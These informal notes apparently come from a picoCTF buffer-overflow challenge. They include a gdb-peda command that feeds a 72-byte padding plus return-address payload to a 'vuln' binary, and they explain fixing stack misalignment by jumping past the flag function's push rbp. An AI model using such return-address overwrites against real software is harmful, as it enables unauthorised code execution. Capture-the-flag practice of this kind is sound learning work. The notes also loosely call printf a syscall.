if we go through it like we did before we get seg fault
    this happens mostly due to the stack misallignment before a SYSCALL (like printf in our case to print the flag)

in case of stack misallignment we see the source or destination operand is a memory operand, is not 16-byte alligned
    meaning the addr%16 will not be zero(mp will be 8)

in our case we can check this by gdb
    gdb-peda ./vuln
    r <<< $( python -c "print('A'*72 + '\x36\x12\x40\x00\x00\x00\x00\x00')")
    p $rsp+0x50
        this will give $1 = (void *) 0x7fffffffdc38
    p ((unsigned int)$1) % 16
        this will be 8

now as we can see that the stack is mis alligned 
if we press n now we will get this error
    0x00007ffff7e2273b in buffered_vfprintf (s=0x7ffff7f97760 <_IO_2_1_stdout_>, format=format@entry=0x7fffffffdbe8 "picoCTF{test_flag}", args=args@entry=0x7fffffffdb08, mode_flags=mode_flags@entry=0x0) at ./stdio-common/vfprintf-internal.c:1734
    1734	./stdio-common/vfprintf-internal.c: No such file or directory.


Now make the stack aligned again we will not push the rbp register onto the stack in the start of the flag function and make the return register to point to the instruction after the push rbp instruction 
    that is the +0x5 address ahead


    
